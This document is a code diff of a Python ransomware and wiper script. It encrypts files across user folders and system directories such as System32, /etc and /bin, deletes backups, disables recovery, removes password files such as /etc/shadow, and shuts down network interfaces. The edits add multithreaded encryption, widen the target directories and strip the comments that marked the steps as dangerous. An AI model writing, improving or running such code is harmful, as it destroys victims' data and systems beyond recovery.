@@ -5,8 +5,8 @@ import shutil
 import subprocess
 from cryptography.fernet import Fernet
 import platform
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Function to find all files in a directory
 def find_files(directory):
     files = []
     for root, dirs, file_list in os.walk(directory):
@@ -16,33 +16,53 @@ def find_files(directory):
             files.append(os.path.join(root, file_name))
     return files
 
-# Function to get all root directories for encryption
-def get_root_directories():
+def get_target_directories():
     if platform.system() == "Windows":
-        drives = []
-        for drive in range(65, 91):
-            if os.path.exists(chr(drive) + ':\\'):
-                drives.append(chr(drive) + ':\\')
-        return drives
+        user_dir = os.getenv("USERPROFILE")
+        return [
+            user_dir,
+            os.path.join(user_dir, "Documents"),
+            os.path.join(user_dir, "Pictures"),
+            os.path.join(user_dir, "Videos"),
+            os.path.join(user_dir, "Music"),
+            os.path.join(user_dir, "Desktop"),
+            os.path.join(user_dir, "Downloads"),
+            "C:\\Program Files",
+            "C:\\Program Files (x86)",
+            "C:\\Users",
+            "C:\\Windows\\System32",
+            "C:\\Windows\\SysWOW64",
+            "C:\\Windows\\WinSxS"
+        ]
     else:
-        return ['/']
+        return [
+            "/home",
+            "/root",
+            "/etc",
+            "/var",
+            "/usr",
+            "/usr/local",
+            "/srv",
+            "/opt",
+            "/lib",
+            "/lib64",
+            "/bin",
+            "/sbin",
+            "/tmp"
+        ]
 
-# Finding all files starting from root directories
 files = []
-for root_dir in get_root_directories():
-    files.extend(find_files(root_dir))
+for target_dir in get_target_directories():
+    files.extend(find_files(target_dir))
 
-print("Files to be encrypted:", files)
+print("Files to be encrypted:", len(files))
 
-# Generating a key
 key = Fernet.generate_key()
 
-# Saving the key to a file
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
 
-# Encrypting all the files found
-for file in files:
+def encrypt_file(file):
     try:
         with open(file, "rb") as thefile:
             contents = thefile.read()
@@ -53,9 +73,13 @@ for file in files:
     except Exception as e:
         print(f"Skipping file {file} due to {e}")
 
+with ThreadPoolExecutor(max_workers=10) as executor:
+    futures = [executor.submit(encrypt_file, file) for file in files]
+    for future in as_completed(futures):
+        future.result()
+
 print("Encryption process completed.")
 
-# Remove system backups and disable recovery options (DANGEROUS)
 def remove_backups():
     backup_paths = {
         "Linux": ["/var/backups", "/mnt/backup", "/etc/backups"],
@@ -84,7 +108,6 @@ def disable_recovery():
         except Exception as e:
             print(f"Could not disable Linux recovery due to {e}")
 
-# Delete important system files (DANGEROUS)
 def delete_important_files():
     important_files = {
         "Linux": ["/etc/passwd", "/etc/shadow"],
@@ -99,7 +122,6 @@ def delete_important_files():
         except Exception as e:
             print(f"Could not delete {file} due to {e}")
 
-# Disable network interfaces (DANGEROUS)
 def disable_network():
     if platform.system() == "Windows":
         try:
@@ -114,13 +136,16 @@ def disable_network():
         except Exception as e:
             print(f"Could not disable network interfaces on Linux due to {e}")
 
-# Execute catastrophic actions
 remove_backups()
 disable_recovery()
 delete_important_files()
 disable_network()
 
 print("Catastrophic actions completed.")
+
+
+
+
 
 
 
